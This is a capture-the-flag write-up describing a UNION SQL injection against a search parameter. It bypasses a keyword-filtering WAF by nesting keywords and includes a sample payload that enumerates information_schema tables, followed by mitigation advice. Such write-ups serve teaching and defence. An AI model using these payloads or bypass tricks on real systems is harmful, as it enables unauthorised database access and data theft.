# database_hunting

**Category:** UNION SQL Injection + WAF Bypass

## Vulnerability
SQL Injection in the search parameter. A keyword-based WAF was present but trivially bypassed by doubling keywords.

## WAF Bypass
The filter blocked `SELECT`, `WHERE`, `UNION` — bypassed by nesting them:
```
SELECT  →  sSELECTelect
WHERE   →  wWHEREhere
UNION   →  uUNIONnion
```

## Approach
1. Identified `name=` parameter in search as injectable
2. Bypassed WAF using doubled keywords
3. UNION injection to query `information_schema` for table names
4. Located tables prefixed with `ft` containing flag data
5. Extracted column names then dumped the flag

## Sample Payload
```sql
' uUNIONnion sSELECTelect null,(sSELECTelect group_concat(table_name) 
from infoorrmation_schema.tables wwherehere table_schema=schema()),null,...#--
```

## Exploit
See [exploit.py](./exploit.py) — automated table enumeration and extraction.

## Mitigation
- **Prepared statements** — WAF keyword filters are not a substitute
- Least privilege — DB user should only access necessary tables
- Remove `information_schema` access for the app DB user
